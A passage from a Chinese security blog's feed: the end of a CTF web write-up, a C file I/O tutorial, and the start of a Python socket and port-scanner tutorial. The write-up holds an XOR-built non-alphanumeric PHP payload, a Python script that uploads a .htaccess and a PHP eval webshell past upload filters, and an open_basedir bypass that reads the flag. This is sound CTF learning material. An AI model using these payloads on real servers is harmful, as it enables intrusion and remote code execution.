list(ee)</span><br><span class="line"><span class="comment"># 遍历能够抑或出_GET的不可见字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(i) <span class="keyword">not</span> <span class="keyword">in</span> list(ee)) &amp; (chr(j) <span class="keyword">not</span> <span class="keyword">in</span> list(ee)):</span><br><span class="line">            tem = i^j</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"_"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:])+<span class="string">"^"</span>+str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                _.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"G"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                G.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"E"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                E.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"T"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                T.append(temp)</span><br><span class="line"><span class="keyword">print</span> _</span><br><span class="line"><span class="keyword">print</span> G</span><br><span class="line"><span class="keyword">print</span> E</span><br><span class="line"><span class="keyword">print</span> T</span><br></pre></td></tr></table></figure><p>发现能够构成<code>_GET</code>的有很多：</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbvBZJ.png" alt=""></p><p>随便取一个构成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%81%81%81%81^%de%c6%c4%d5&#125;&#123;%81&#125;();&amp;%81&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>至于<code>payload</code>的构成原理可以参考这几个师傅写的文章，挺有意思的，之后也会写一篇文章仔细分析：</p><p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">PHP不使用数字,字母和下划线写shell</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>然后再看第二部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要我们上传一个文件，过滤了ph和&lt;?，和<code>CheckIn</code>有些相似，不过这里是apache+php，我们可以上传.htaccess文件绕过过滤，另外注意需要伪造文件头。</p><p>这里直接贴脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7026ab1a-8dc8-45a4-b735-d8125d6b04b9.node1.buuoj.cn/?_=$&#123;%81%81%81%81^%de%c6%c4%d5&#125;&#123;%81&#125;();&amp;%81=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过文件头检测：\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.cc"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment"># shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>, (<span class="string">'.htaccess'</span>, htaccess, <span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;"http": "http://127.0.0.1:8080"&#125;</span></span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>, (<span class="string">'shell.cc'</span>, shell, <span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>拿到shell之后，发现有open_basedir限制，只能读<code>/var/www/html/</code> 和<code>/tmp/</code>：</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbN9Iv.png" alt=""></p><p>这里我们可以用之前<code>twitter</code>上新出的 open_basedir Bypass来绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure><p>具体分析：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a></p><h2 id="Upload2"><a href="#Upload2" class="headerlink" title="Upload2"></a>Upload2</h2><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前几天打的一个比赛，有些自闭，趁着有时间（X-NCUA做不出来2333）来复现一下。&lt;/p&gt;
&lt;h2 id=&quot;CheckIn&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>C语言 文件读写</title>
    <link href="https://www.sketchplane.top/2019/08/13/C%E8%AF%AD%E8%A8%80-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
    <id>https://www.sketchplane.top/2019/08/13/C%E8%AF%AD%E8%A8%80-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</id>
    <published>2019-08-13T14:40:46.000Z</published>
    <updated>2019-08-13T14:41:34.159Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被要求写的教程，直接删了感觉可惜，毕竟<del>百度</del>写了那么久，当作备忘录要用的时候看看吧。</p><h2 id="0x00-打开文件"><a href="#0x00-打开文件" class="headerlink" title="0x00 打开文件"></a>0x00 打开文件</h2><p>我们通常使用<code>fopen()</code>函数来<strong>打开/创建</strong>一个文件，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">const</span> <span class="keyword">char</span> * mode )</span></span>;</span><br></pre></td></tr></table></figure><p>其中的<strong>filename</strong>为需要<strong>打开/新建</strong>的文件的名称，<strong>mode</strong>为打开的模式，具体描述如下：</p><p><img src="https://t1.picb.cc/uploads/2019/08/13/g3NPH6.png" alt="img"></p><p>如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"rb"</span>, <span class="string">"wb"</span>, <span class="string">"ab"</span>, <span class="string">"rb+"</span>, <span class="string">"r+b"</span>, <span class="string">"wb+"</span>, <span class="string">"w+b"</span>, <span class="string">"ab+"</span>, <span class="string">"a+b"</span></span><br></pre></td></tr></table></figure><p>另外函数返回值<strong>FILE*</strong>为文件指针，通常又称为文件句柄，我们进行其他文件操作时它通常作一个起标记作用的参数。</p><h3 id="fopen-用法举例"><a href="#fopen-用法举例" class="headerlink" title="fopen() 用法举例"></a>fopen() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 桌面生成 test.txt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// 注意改为自己电脑路径</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-关闭文件"><a href="#0x01-关闭文件" class="headerlink" title="0x01 关闭文件"></a>0x01 关闭文件</h2><p>打开一个文件后顺便书写关闭文件的代码是一个好习惯。关闭文件的函数为<code>fclose()</code>，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>如果成功关闭文件，<strong>fclose( )</strong>函数返回零，如果关闭文件时发生错误，函数返回<strong>EOF</strong>。</p><p>PS：<strong>EOF</strong>(end of file) 为文件结束符，在C语言中其值通常为<code>-1</code>(具体值还要看编译器</p><p>细心的同学可能注意到了，之前的例子没有关闭文件，在这里我们给它加上去：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 桌面生成 test.txt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// 注意改为自己电脑路径</span></span><br><span class="line">    <span class="comment">// 文件读写操作</span></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在了解了打开和关闭文件之后，我们文件读写大致的框架已经有了，接下来只需要学习在打开文件和关闭文件之间的事情：写入文件和读取文件。</p><p>方便起见，之后的例子就不再把代码完整写一遍了。</p><h2 id="0x02-写入文件"><a href="#0x02-写入文件" class="headerlink" title="0x02 写入文件"></a>0x02 写入文件</h2><p><code>fputc()</code>函数可以向文件中写入一个字符，其函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputc</span><span class="params">( <span class="keyword">int</span> c, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>其中<strong>fp</strong>就是打开文件之后返回的文件指针，<strong>c</strong>为需要写入字符的ascii值。</p><h3 id="fputc-用法举例"><a href="#fputc-用法举例" class="headerlink" title="fputc() 用法举例"></a>fputc() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将字符写入文件</span></span><br><span class="line"><span class="keyword">char</span> c = <span class="string">'a'</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// 注意改为自己电脑路径</span></span><br><span class="line">fputc(c, fp);</span><br></pre></td></tr></table></figure><p>一次写一个字符似乎不太方便，而用循环解决感觉不是很优雅，<code>fputs()</code>用于向文件中写入一个字符串，可以解决我们的问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputs</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *s, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p><strong>fp</strong>依旧是你打开文件的文件指针，<strong>s</strong>为需要写入的字符串。</p><h3 id="fputs-用法举例"><a href="#fputs-用法举例" class="headerlink" title="fputs() 用法举例"></a>fputs() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将字符串写入文件</span></span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">"PHP is the best languages for web programming :)"</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// 注意改为自己电脑路径</span></span><br><span class="line"><span class="built_in">fputs</span>(str, fp);</span><br></pre></td></tr></table></figure><p>另外还有<code>fprint()</code>函数，看上去和<code>printf()</code>函数很像，确实如此，它只比<code>printf()</code>多了一个文件指针参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">cint <span class="title">fprintf</span> <span class="params">( FILE *fp, <span class="keyword">char</span> * format, ... )</span></span>;</span><br></pre></td></tr></table></figure><p>指定你需要写入的文件的句柄，你就能像使用<code>printf()</code>函数一样向文件里写入内容了。</p><h3 id="fprintf-用法举例"><a href="#fprintf-用法举例" class="headerlink" title="fprintf() 用法举例"></a>fprintf() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 格式化写入文件</span></span><br><span class="line"><span class="keyword">char</span> *s = <span class="string">"this is a string."</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// 注意改为自己电脑路径</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"%s %d"</span>, s,i);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h2 id="0x03-读取文件"><a href="#0x03-读取文件" class="headerlink" title="0x03 读取文件"></a>0x03 读取文件</h2><p>同样地，C语言有读取一个字符的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fgetc</span><span class="params">( FILE * fp )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fgetc()</code>函数从<strong>fp</strong>所指向的输入文件中读取一个字符。<strong>返回值是读取的字符</strong>，如果发生错误则返回<strong>EOF</strong>。</p><h3 id="fgetc-用法举例"><a href="#fgetc-用法举例" class="headerlink" title="fgetc() 用法举例"></a>fgetc() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取文件单个字符</span></span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line">FILE *fp = fopen(<span class="string">"filename"</span>, <span class="string">"r"</span>);  <span class="comment">// 注意直接填文件名是相对路径</span></span><br><span class="line">ch = fgetc(fp);</span><br></pre></td></tr></table></figure><p>同样地，也有读取一个字符串的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">( <span class="keyword">char</span> *buf, <span class="keyword">int</span> n, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fgets()</code>函数从<strong>fp</strong>所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区<strong>buf</strong>，并在最后追加一个<strong>null</strong>字符来终止字符串。</p><h3 id="fgets-用法举例"><a href="#fgets-用法举例" class="headerlink" title="fgets() 用法举例"></a>fgets() 用法举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用fgets()实现按行读取文本文件内容</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></span><br><span class="line"><span class="keyword">char</span> str[MAX_LINE];</span><br><span class="line">FILE *fp = fopen(<span class="string">"filename"</span>, <span class="string">"r"</span>);  <span class="comment">// 注意直接填文件名是相对路径</span></span><br><span class="line">fgets(str, MAX_LINE, fp);</span><br></pre></td></tr></table></figure><p>有<code>fprintf()</code>自然就也还有<code>fscanf()</code>函数，它用于格式化读取文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fscanf</span> <span class="params">( FILE *fp, <span class="keyword">char</span> * format, ... )</span></span>;</span><br></pre></td></tr></table></figure><p>同样它也只需要指定文件指针，然后和<code>scanf()</code>函数没有多大差别。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 格式化读取文件内容</span></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> *str;</span><br><span class="line"><span class="built_in">fscanf</span>(fp, <span class="string">"%d %s"</span>, &amp;i, str);</span><br></pre></td></tr></table></figure><h2 id="0x04-实例"><a href="#0x04-实例" class="headerlink" title="0x04 实例"></a>0x04 实例</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>尝试编写一个程式，输入学号、姓名以及科目成绩保存至文件中，之后<strong>按行读取数据并保存至相应变量中</strong>，再输出到屏幕上。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>以上是C语言中文件操作的一些基础用法，当然，这篇教程只是抛砖引玉，还有像<code>fwrite()</code>和<code>fread()</code>的函数没有介绍，上面的例子也只是一个模板，方法不限，能够实现功能即可（当然代码越漂亮越好，因为之后的大作业也会遇到= =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;被要求写的教程，直接删了感觉可惜，毕竟&lt;del&gt;百度&lt;/del&gt;写了那么久，当作备忘录要用的时候看看吧。&lt;/p&gt;
&lt;h2 id=&quot;0x00-
      
    
    </summary>
    
    
    
      <category term="备忘录" scheme="https://www.sketchplane.top/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Python脚本学习(一)</title>
    <link href="https://www.sketchplane.top/2019/07/23/python%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
    <id>https://www.sketchplane.top/2019/07/23/python%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/</id>
    <published>2019-07-23T03:19:00.000Z</published>
    <updated>2019-07-23T04:44:58.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习python网络脚本编写，利用tcp客户端/服务器学习编写了一个代替netcat(简陋)的工具，记录一下。</p><h2 id="TCP-客户端"><a href="#TCP-客户端" class="headerlink" title="TCP 客户端"></a>TCP 客户端</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置连接ip和端口</span></span><br><span class="line">target_host = <span class="string">"0.0.0.0"</span></span><br><span class="line">target_port = <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket对象</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接</span></span><br><span class="line">client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送消息</span></span><br><span class="line">client.send(<span class="string">"Hey, I'm TCP client service!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取响应并打印</span></span><br><span class="line">response = client.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> response</span><br></pre></td></tr></table></figure><p>这是一个简单的TCP客户端，向指定的ip和端口发送数据，然后将返回输出，由这个我们可以拓展出一个简易的端口扫描器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 设置扫描的主机</span></span><br><span class="line">hosts = [<span class="string">'127.0.0.1'</span>, <span class="string">'192.168.0.1'</span>, <span class="string">'10.0.0.1'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置常用端口</span></span><br><span class="line">ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line"><span class="comment"># 遍历列表，获取到有相应的端口时打印</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Attempting to connect to "</span> + host + <span class="string">':'</span> + str(port)</span><br><span class="line">            s.connect((host, port))</span><br><span class="line">            s.send(<span class="string">'sketch_pl4ne \n'</span>)</span><br><span class="line">            banner = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> banner:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Host:"</span> + host + <span class="string">"Port:"</span> + str(port) +<span class="string">" open:"</span> + banner</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>效果图如下：</p><p><img src="https://i.loli.net/2019/07/23/5d3684d8d1a8c28493.png" alt=""></p><p>感觉有那么点意思了= =</p><h2 id="TCP-服务器"><a href="#TCP-服务器" class="headerlink" title="TCP 服务器"></a>TCP 服务器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 